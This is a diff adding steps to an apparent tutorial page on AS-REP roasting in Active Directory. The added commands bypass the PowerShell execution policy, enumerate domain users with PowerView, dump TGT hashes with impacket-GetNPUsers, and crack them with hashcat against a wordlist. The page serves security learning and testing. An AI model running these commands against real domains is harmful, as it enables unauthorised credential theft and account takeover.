@@ -6,6 +6,10 @@
 
 {% embed url="https://jumpcloud.com/it-index/what-is-as-rep-roasting" %}
 
+{% embed url="https://www.kali.org/tools/impacket-scripts/#impacket-getnpusers" %}
+
+{% embed url="https://www.netwrix.com/as-rep-roasting.html" %}
+
 ### What is AS-REP roasting?
 
 #### Pre-authentication enabled
@@ -21,14 +25,41 @@ However, with pre-authentication disabled, the KDC prematurely sends an **authen
 First, we have to retrieve a list of user accounts in the AD network:
 
 ```powershell
-PS> 
+C:\> powershell -ep bypass
+PS> Import-Module PowerView.ps1
+PS>  Get-DomainUser
 ```
 
 ### (2) Enumerate user accounts with pre-authentication disabled, and perform AS-REQ
 
+Next, we can use the `impacket-GetNPUsers` script which&#x20;
+
+> Queries target domain for users with 'Do not require Kerberos\
+> preauthentication' set and export their TGTs for cracking:
+
+{% code overflow="wrap" %}
+```sh
+$ impacket-GetNPUsers -dc-ip <DOMAIN_CONTROLLER> -usersfile <PATH_TO_USERS_LIST> -format {hashcat,john}
+```
+{% endcode %}
+
+* `-dc-ip:` Address of the domain controller
+* `-usersfile:` List of domain users to check against (retrieved from previous step)
+* `-format:` Output format (hashcat or john). Default is hashcat.
+
+With this, we should retrieve the TGTs for the users with the pre-authentication disabled.
+
 ### (3) Offline cracking
 
+Given that we output the hashes in hashcat format, we can perform the following commands to crack the passwords:
 
+```sh
+$ hashcat -a 0 -m 18200 <path_to_hashes> <wordlist>
+
+# eg. 
+$ echo xxx > hashes.txt
+$ hashcat -a 0 -m 18200 hashes.txt /usr/share/wordlist/rockyou.txt
+```
 
 
 
